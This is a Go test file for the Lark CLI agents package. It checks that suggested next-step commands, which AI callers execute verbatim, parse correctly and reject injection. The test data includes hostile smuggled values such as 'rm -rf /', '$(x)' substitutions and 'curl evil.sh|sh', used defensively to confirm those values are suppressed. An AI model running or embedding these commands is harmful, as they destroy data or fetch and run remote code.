// Copyright (c) 2026 Lark Technologies Pte. Ltd.
// SPDX-License-Identifier: MIT

package agents

import (
	"strings"
	"testing"

	iagents "github.com/larksuite/cli/internal/agents"
)

// allTaskStates is the full 9-state A2A enum (internal/agent/state.go), so the
// contract test automatically covers any future nextForTask branch keyed on a
// state instead of relying on hand-picked samples.
var allTaskStates = []iagents.TaskState{
	iagents.StateSubmitted,
	iagents.StateWorking,
	iagents.StateInputRequired,
	iagents.StateAuthRequired,
	iagents.StateCompleted,
	iagents.StateFailed,
	iagents.StateCanceled,
	iagents.StateRejected,
	iagents.StateUnknown,
}

// TestNextForTaskCommandsParseAgainstRealTree is the meta.next contract test:
// every next command emitted by nextForTask — across all 9 task states, with
// and without a context id, template hints included (their <...> placeholders
// are single space-free tokens, so they parse as ordinary flag values) — must
// traverse and flag-parse against the real agent command tree. meta.next is
// defined as "AI executes this verbatim", so a next that references a
// nonexistent flag (e.g. --wait on task get) is a broken contract, caught here
// at build time instead of by a failing acceptance run.
func TestNextForTaskCommandsParseAgainstRealTree(t *testing.T) {
	// GIVEN: the real agent subtree (nil Factory: construction-time only, no
	// credentials; all meta.next commands live under `lark-cli agents ...`).
	agentTree := NewCmdAgents(nil)

	for _, state := range allTaskStates {
		for _, ctxID := range []string{"", "conversation_1"} {
			task := &iagents.AgentTask{
				TaskID:     "chat_1",
				ContextID:  ctxID,
				State:      state,
				IsTerminal: state.IsTerminal(),
			}
			next := nextForTask("fakeflow:agent_x", task, nil, nil, iagents.VerbSend)
			if len(next) == 0 {
				t.Fatalf("state %s (ctx %q): legit task must produce next hints", state, ctxID)
			}
			for _, n := range next {
				if state == iagents.StateAuthRequired {
					// auth_required is an agent-side task state whose next step is
					// the auth (re-authorize) flow, so it legitimately points OUT
					// of the agent subtree and is not traversable against
					// agentTree; assert its shape and skip the agent traversal.
					if !strings.HasPrefix(n.Command, "lark-cli auth login") || !strings.Contains(n.Command, "--scope") {
						t.Fatalf("auth_required next should point to auth login --scope, got %q", n.Command)
					}
					continue
				}
				if !strings.HasPrefix(n.Command, "lark-cli agents ") {
					t.Fatalf("next %q must target the agent subtree", n.Command)
				}
				// WHEN: the command string is parsed against the real tree.
				argv := strings.Fields(strings.TrimPrefix(n.Command, "lark-cli agents "))
				c, flags, err := agentTree.Traverse(argv)
				// THEN: it traverses to a leaf and its flags all exist.
				if err != nil {
					t.Fatalf("state %s (ctx %q): next %q not traversable: %v", state, ctxID, n.Command, err)
				}
				if c == agentTree {
					t.Fatalf("state %s (ctx %q): next %q did not reach a subcommand", state, ctxID, n.Command)
				}
				if err := c.ParseFlags(flags); err != nil {
					t.Fatalf("state %s (ctx %q): next %q flags invalid: %v", state, ctxID, n.Command, err)
				}
			}
		}
	}
}

// TestNextForTaskRejectsInjectionIDs pins the security whitelist: a
// server-supplied task_id that is not pure [A-Za-z0-9_-] must suppress the
// whole next entry (omit rather than risk injection), in every state —
// meta.next commands are executed verbatim by AI callers, so shell
// metacharacters in an interpolated id are command injection.
func TestNextForTaskRejectsInjectionIDs(t *testing.T) {
	for _, bad := range []string{"chat_1; rm -rf /", "chat `x`", "chat 1", `chat"1"`, "chat$(x)", "chat|x"} {
		for _, state := range allTaskStates {
			task := &iagents.AgentTask{TaskID: bad, State: state}
			if next := nextForTask("fakeflow:agent_x", task, nil, nil, iagents.VerbSend); len(next) != 0 {
				t.Fatalf("injection task_id %q (state %s) must suppress next, got %+v", bad, state, next)
			}
		}
	}
}

// TestNextForTaskRejectsUnsafeRef pins the ref whitelist:
// the user-echoed ref is interpolated into every next command, so a ref that
// is not <charset>:<charset> (exactly one ':', [A-Za-z0-9_-] on both sides)
// suppresses the whole hint — a ref with spaces/quotes would make the command
// un-copy-pasteable at best and an injection surface at worst.
func TestNextForTaskRejectsUnsafeRef(t *testing.T) {
	task := &iagents.AgentTask{TaskID: "chat_1", State: iagents.StateWorking}
	for _, bad := range []string{"fakeflow:agent x", "fakeflow:x;rm -rf /", "fakeflow", "a:b:c", "fakeflow:$(x)", `fakeflow:"x"`, ":x", "fakeflow:"} {
		if next := nextForTask(bad, task, nil, nil, iagents.VerbSend); len(next) != 0 {
			t.Errorf("unsafe ref %q should suppress the whole next, got %+v", bad, next)
		}
	}
	if next := nextForTask("fakeflow:agent_x", task, nil, nil, iagents.VerbSend); len(next) == 0 {
		t.Error("valid ref fakeflow:agent_x should keep next")
	}
}

// TestNextForTaskDegradesInjectionContextID pins the context_id whitelist with
// its degradation semantics: a legit task_id with an injection-shaped
// context_id (input_required branch interpolates both) keeps the hint but
// replaces the dirty id with the <context_id> placeholder — Template:true, no
// untrusted content interpolated.
func TestNextForTaskDegradesInjectionContextID(t *testing.T) {
	dirty := "conv_1; curl evil.sh|sh"
	task := &iagents.AgentTask{
		TaskID:    "chat_1",
		ContextID: dirty,
		State:     iagents.StateInputRequired,
	}
	next := nextForTask("fakeflow:agent_x", task, nil, nil, iagents.VerbSend)
	if len(next) != 1 {
		t.Fatalf("dirty context_id must degrade, not drop the hint, got %+v", next)
	}
	if !next[0].Template {
		t.Errorf("degraded hint must be template=true, got %+v", next[0])
	}
	if !strings.Contains(next[0].Command, "<context_id>") {
		t.Errorf("degraded hint must use the <context_id> placeholder: %q", next[0].Command)
	}
	if strings.Contains(next[0].Command, "conv_1") {
		t.Errorf("dirty context_id leaked into the command: %q", next[0].Command)
	}
}

// TestNextForTaskAuthRequiredPointsToAuth pins F6: auth_required is an
// agent-side task state (the end user must (re)authorize in the agent), NOT a
// text-continuation like input_required. Its next must point at the auth
// re-authorize flow (auth login --scope), never reuse the text-continuation
// send hint.
func TestNextForTaskAuthRequiredPointsToAuth(t *testing.T) {
	task := &iagents.AgentTask{TaskID: "chat_1", ContextID: "conv_1", State: iagents.StateAuthRequired}
	next := nextForTask("fakeflow:agent_x", task, nil, nil, iagents.VerbSend)
	if len(next) != 1 {
		t.Fatalf("auth_required should produce 1 next, got %+v", next)
	}
	// Must NOT be the input_required text-continuation hint.
	if strings.Contains(next[0].Command, "agents send") || strings.Contains(next[0].Command, "--text") {
		t.Fatalf("auth_required should not reuse the text-continuation hint, got %q", next[0].Command)
	}
	// Must point at the auth (re-authorize) flow.
	if !strings.HasPrefix(next[0].Command, "lark-cli auth login") || !strings.Contains(next[0].Command, "--scope") {
		t.Fatalf("auth_required should point to auth login --scope, got %q", next[0].Command)
	}
	// The concrete scopes come from the card, so the command carries a
	// placeholder and must be marked template.
	if !next[0].Template {
		t.Errorf("contains a placeholder, should be Template=true, got %+v", next[0])
	}
}

// TestNextForTaskWatchNotWait pins the flag-name fix and the bounded-watch
// default: task get has --watch, not --wait, and the poll hint must suggest a
// BOUNDED watch (`--watch --timeout <default>`) so an AI caller neither blocks
// forever on a long task nor self-hammers with unbounded polls.
func TestNextForTaskWatchNotWait(t *testing.T) {
	next := nextForTask("fakeflow:agent_x", &iagents.AgentTask{TaskID: "chat_1", State: iagents.StateWorking}, nil, nil, iagents.VerbSend)
	if len(next) == 0 {
		t.Fatal("working task must produce a poll next")
	}
	if !strings.Contains(next[0].Command, "--watch") || strings.Contains(next[0].Command, "--wait") {
		t.Fatalf("poll next must use --watch: %+v", next)
	}
	wantTimeout := "--timeout 90s" // meta.next shows whole seconds (90s), not Go's 1m30s; keep in sync with defaultWatchTimeout
	if !strings.Contains(next[0].Command, wantTimeout) {
		t.Fatalf("poll next must be bounded with %q, got %+v", wantTimeout, next)
	}
}

// TestNextForTaskQuestionGroup pins that an input_required task carrying a
// question group yields ONE per-question --answer template (bare <option_id>
// for a choice, marked repeatable for multi-select, .text=<text> for free text,
// a group with any whitelist-failing question_id falls back
// to the free-text continuation (a key the CLI's own guard would reject is
// never emitted).
func TestNextForTaskQuestionGroup(t *testing.T) {
	group := nextForTask("fakeflow:planner", &iagents.AgentTask{
		TaskID: "task_1", ContextID: "ctx_1", State: iagents.StateInputRequired,
		InputRequired: &iagents.InputRequired{
			Label: "report confirmation",
			Questions: []iagents.Question{
				{QuestionID: "q1_a8", Question: "dimension?", Options: []iagents.Option{{OptionID: "by_region", Label: "by region"}}},
				{QuestionID: "q2_a8", Question: "time range?"},
				{QuestionID: "q3_a8", Question: "regions?", MultiSelect: true, Options: []iagents.Option{{OptionID: "east", Label: "east"}}},
			},
		},
	}, nil, nil, iagents.VerbSend)
	if len(group) != 1 || !group[0].Template {
		t.Fatalf("question-group next must be one template action, got %+v", group)
	}
	for _, want := range []string{
		"--answer q1_a8=<option_id>",
		"--answer q2_a8.text=<text>",
		"--answer q3_a8=<option_id, repeatable>",
		"--task-id task_1",
	} {
		if !strings.Contains(group[0].Command, want) {
			t.Errorf("question-group command should contain %q, got %q", want, group[0].Command)
		}
	}
	if !strings.Contains(group[0].Label, "Relay the question group") {
		t.Errorf("label must be relay-first wording, got %q", group[0].Label)
	}
	// A question_id with shell metacharacters must NOT be interpolated → the
	// whole group falls back to the --text continuation.
	badID := nextForTask("fakeflow:planner", &iagents.AgentTask{
		TaskID: "task_1", ContextID: "ctx_1", State: iagents.StateInputRequired,
		InputRequired: &iagents.InputRequired{
			Questions: []iagents.Question{{QuestionID: "q bad;rm", Question: "x"}},
		},
	}, nil, nil, iagents.VerbSend)
	if len(badID) != 1 || strings.Contains(badID[0].Command, "--answer") || !strings.Contains(badID[0].Command, "--text") {
		t.Errorf("a whitelist-failing question_id should fall back to the --text form, got %+v", badID)
	}
	// A flag-lookalike question_id ("--text" passes a bare charset test but not
	// the alphanumeric-first rule) must likewise never be interpolated.
	flagLike := nextForTask("fakeflow:planner", &iagents.AgentTask{
		TaskID: "task_1", ContextID: "ctx_1", State: iagents.StateInputRequired,
		InputRequired: &iagents.InputRequired{
			Questions: []iagents.Question{{QuestionID: "--text", Question: "x"}},
		},
	}, nil, nil, iagents.VerbSend)
	if len(flagLike) != 1 || strings.Contains(flagLike[0].Command, "--answer") {
		t.Errorf("a flag-lookalike question_id must fall back, got %+v", flagLike)
	}
}

func TestNextForTaskDoesNotSuggestStructuredAnswerWhenCapabilityIsDisabled(t *testing.T) {
	next := nextForTask("base:assistant", &iagents.AgentTask{
		TaskID: "task_1", ContextID: "ctx_1", State: iagents.StateInputRequired,
		InputRequired: &iagents.InputRequired{
			Questions: []iagents.Question{{
				QuestionID: "q_scene",
				Question:   "pick a scenario",
				Options:    []iagents.Option{{OptionID: "opt_create", Label: "create"}},
			}},
		},
	}, &iagents.AgentSpec{InputRequired: false}, nil, iagents.VerbTaskGet)
	if len(next) != 1 || !strings.Contains(next[0].Command, "--text <your_reply>") || strings.Contains(next[0].Command, "--answer") {
		t.Fatalf("disabled structured input must fall back to text continuation, got %+v", next)
	}
}

// TestNextForTaskTemplateFlag pins the template marker semantics: the
// input_required continue hint carries a <your_reply> placeholder, so it must be
// marked template=true (not directly executable); poll and terminal-detail
// hints are verbatim-executable and must not carry the marker.
func TestNextForTaskTemplateFlag(t *testing.T) {
	// input_required with a known context: placeholder in --text → template.
	cont := nextForTask("fakeflow:agent_x", &iagents.AgentTask{
		TaskID: "chat_1", ContextID: "conv_1", State: iagents.StateInputRequired,
	}, nil, nil, iagents.VerbSend)
	if len(cont) != 1 || !cont[0].Template {
		t.Fatalf("input_required next must be template=true, got %+v", cont)
	}
	// input_required without a context id: <context_id> placeholder → template.
	contNoCtx := nextForTask("fakeflow:agent_x", &iagents.AgentTask{
		TaskID: "chat_1", State: iagents.StateInputRequired,
	}, nil, nil, iagents.VerbSend)
	if len(contNoCtx) != 1 || !contNoCtx[0].Template {
		t.Fatalf("input_required (no ctx) next must be template=true, got %+v", contNoCtx)
	}
	// Poll and terminal-detail hints are directly executable → no template flag.
	for _, task := range []*iagents.AgentTask{
		{TaskID: "chat_1", State: iagents.StateWorking},
		{TaskID: "chat_1", State: iagents.StateCompleted, IsTerminal: true},
	} {
		next := nextForTask("fakeflow:agent_x", task, nil, nil, iagents.VerbSend)
		if len(next) != 1 || next[0].Template {
			t.Fatalf("state %s next must be executable (template unset), got %+v", task.State, next)
		}
	}
}
